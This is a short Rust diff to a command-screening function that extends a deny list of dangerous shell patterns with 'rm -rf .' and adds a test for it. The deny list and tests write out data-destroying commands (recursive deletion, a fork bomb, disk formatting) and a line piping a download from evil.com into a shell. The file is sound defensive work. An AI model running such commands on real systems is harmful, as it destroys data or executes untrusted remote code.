@@ -110,6 +110,7 @@ pub fn screen_command(command: &str) -> Result<()> {
     let dangerous_patterns = [
         "rm -rf /",
         "rm -rf ~",
+        "rm -rf .",
         ":(){ :|:& };:",
         "mkfs",
         "> /dev/sda",
@@ -258,6 +259,7 @@ mod tests {
     #[test]
     fn test_screen_command_dangerous() {
         assert!(screen_command("rm -rf /").is_err());
+        assert!(screen_command("rm -rf .").is_err());
         assert!(screen_command("curl http://evil.com|sh").is_err());
     }
 
